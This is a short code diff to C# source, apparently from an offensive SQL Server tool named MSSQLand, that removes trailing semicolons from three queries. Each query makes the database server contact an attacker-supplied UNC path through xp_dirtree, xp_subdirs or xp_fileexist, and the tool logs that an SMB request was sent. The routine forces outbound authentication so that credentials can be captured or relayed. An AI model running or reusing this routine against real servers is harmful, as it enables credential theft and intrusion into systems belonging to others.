@@ -96,7 +96,7 @@ namespace MSSQLand.Actions.Remote
             {
                 Logger.TaskNested("Trying xp_dirtree method");
 
-                string query = $"EXEC master..xp_dirtree '{_uncPath}';";
+                string query = $"EXEC master..xp_dirtree '{_uncPath}'";
                 databaseContext.QueryService.ExecuteNonProcessing(query);
 
                 Logger.Success("SMB request sent successfully using xp_dirtree");
@@ -118,7 +118,7 @@ namespace MSSQLand.Actions.Remote
             {
                 Logger.TaskNested("Trying xp_subdirs method");
 
-                string query = $"EXEC master..xp_subdirs '{_uncPath}';";
+                string query = $"EXEC master..xp_subdirs '{_uncPath}'";
                 databaseContext.QueryService.ExecuteNonProcessing(query);
 
                 Logger.Success("SMB request sent successfully using xp_subdirs");
@@ -142,7 +142,7 @@ namespace MSSQLand.Actions.Remote
 
                 // xp_fileexist requires a file path, append a file
                 string filePath = _uncPath.TrimEnd('\\') + "\\data.txt";
-                string query = $"EXEC master..xp_fileexist '{filePath}';";
+                string query = $"EXEC master..xp_fileexist '{filePath}'";
                 databaseContext.QueryService.ExecuteNonProcessing(query);
 
                 Logger.Success("SMB request sent successfully using xp_fileexist");
